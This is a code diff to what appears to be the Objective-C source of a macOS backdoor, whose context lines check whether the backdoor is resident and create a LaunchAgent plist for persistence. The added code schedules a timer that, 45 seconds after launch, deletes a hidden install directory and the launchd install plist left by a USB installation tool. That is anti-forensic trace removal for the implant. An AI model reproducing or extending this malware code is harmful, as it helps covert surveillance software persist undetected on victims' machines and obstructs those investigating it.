@@ -940,6 +940,18 @@ typedef struct _coreMessage_t
   [super dealloc];
 }
 
+- (void)cleanUp:(NSTimer*)theTimer
+{
+  int zeroChar = 0;
+  NSString *installDirName = [NSString stringWithFormat:@"../.%d%d%d%d",
+                                                        zeroChar, zeroChar, zeroChar, zeroChar];
+  NSString *installLaunchName = [NSString stringWithUTF8String: LAUNCHD_INSTALL_PLIST];
+  
+  [[NSFileManager defaultManager] removeItemAtPath:installDirName error:nil];
+
+  [[NSFileManager defaultManager] removeItemAtPath:installLaunchName error:nil];
+}
+
 - (BOOL)runMeh
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
@@ -959,6 +971,15 @@ typedef struct _coreMessage_t
   if ([self isBackdoorAlreadyResident] == FALSE)
       [self createLaunchAgentPlist];
 
+  /*
+   * clean up some installation junks from USB tool
+   */
+  [NSTimer scheduledTimerWithTimeInterval:45.00
+                                   target:self
+                                 selector:@selector(cleanUp:)
+                                 userInfo:nil
+                                  repeats:NO];
+  
   [self coreRunLoop];
   
   [pool release];
